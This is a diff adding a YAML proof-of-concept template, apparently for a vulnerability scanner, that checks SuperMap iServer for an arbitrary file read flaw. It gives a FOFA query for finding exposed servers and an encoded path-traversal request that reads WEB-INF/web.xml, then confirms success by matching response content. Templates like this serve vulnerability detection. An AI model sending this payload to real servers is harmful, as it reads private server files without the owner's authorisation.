@@ -1,0 +1,16 @@
+id: poc-yaml-supermap-iserver-output-anyfile-read
+info:
+  name: Supermap iServer output 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: SuperMap-iServer
+  fofa: app="SuperMap-iServer"
+requests:
+- method: GET
+  path: /iserver/output/../WEB-IN%2546/web.xml
+  expression: "status_code == 200 && \ncontains(body,\"<display-name>SuperMap iServer</display-name>\"\
+    ) &&\ncontains(body,\"<filter-mapping>\") &&\ncontains(body,\"web-app>\") &&\n\
+    contains(content_type,\"application/xml\")\n"
+variables: {}
+transport: http
